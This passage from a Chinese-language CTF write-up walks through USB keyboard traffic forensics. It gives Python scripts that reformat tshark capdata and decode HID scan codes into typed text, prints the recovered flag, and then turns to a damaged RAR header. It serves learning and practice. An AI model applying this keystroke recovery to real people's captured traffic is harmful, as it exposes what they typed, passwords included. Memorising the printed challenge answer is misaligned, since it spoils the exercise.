class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2023/1/30 13:59</span><br><span class="hljs-comment"># @Author : Leekos</span><br><span class="hljs-comment"># @File : USB_tshark_键盘capdata添加冒号.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C://Users/LIKE/Desktop/data.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>fi = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C://Users/LIKE/Desktop/out.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a = f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-number">16</span>:  <span class="hljs-comment"># 鼠标流量的话len改为8</span><br>            out = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a), <span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i + <span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out += a[i] + a[i + <span class="hljs-number">1</span>] + <span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out += a[i] + a[i + <span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p>如图：</p><img src="https://s2.loli.net/2023/01/30/E3ebm4GlRLHT5qP.png" alt="image-20230130140736769" style="zoom:33%;" /><p>此时对应的第三字节，也就是**[6:8]**就代表了击键信息</p><p>提取出键盘流量后需要用<strong>脚本还原数据对应的信息</strong>。同时找到两个还原信息的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br>mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C://Users/LIKE/Desktop/out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>脚本2（两个都可以）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python3</span><br><br>normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C://Users/LIKE/Desktop/out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>运行脚本：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">输出：<br><span class="hljs-keyword">output</span> :<span class="hljs-built_in">key</span>&#123;xinan&#125;<br></code></pre></td></tr></table></figure><p>于是我们得到密钥：<code>xinan</code></p><p><a href="https://qwzf.github.io/2020/08/01/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B(%E4%BA%8C)-USB%E6%B5%81%E9%87%8F/">参考：USB流量分析</a></p><p>我们也可以使用工具: <code>UsbKeyboardDataHacker</code></p><p><img src="https://s2.loli.net/2023/01/30/eCHlJzgISx2pPZG.png" alt="image-20230130141107287"></p><p>接着我们再分析那一个rar压缩包：</p><p><img src="https://s2.loli.net/2023/01/30/Re5TmkMrgq9PAIv.png" alt="image-20230130141213163"></p><p>发现文件头损坏，于是查资料进行对照，</p><p><img 